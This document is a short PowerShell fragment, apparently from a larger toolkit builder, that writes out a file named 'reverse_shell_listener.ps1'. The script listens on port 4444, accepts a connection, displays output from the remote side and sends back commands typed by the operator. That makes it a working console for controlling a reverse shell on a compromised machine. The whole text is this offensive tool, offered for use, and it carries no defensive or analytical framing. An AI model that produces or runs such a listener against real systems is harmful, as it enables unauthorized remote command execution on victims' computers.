Write-Script "reverse_shell_listener.ps1" @'
# Simple TCP listener (for receiving connections)
param([int]$Port = 4444)
Write-Host "Listening on port $Port..." -ForegroundColor Yellow
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
$listener.Start()
$client = $listener.AcceptTcpClient()
Write-Host "Connection received from $($client.Client.RemoteEndPoint)" -ForegroundColor Green
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($client.Connected) {
    $data = $reader.ReadLine()
    if ($data) { Write-Host $data }
    $cmd = Read-Host ">"
    if ($cmd) { $writer.WriteLine($cmd) }
}
$client.Close()
$listener.Stop()
'@

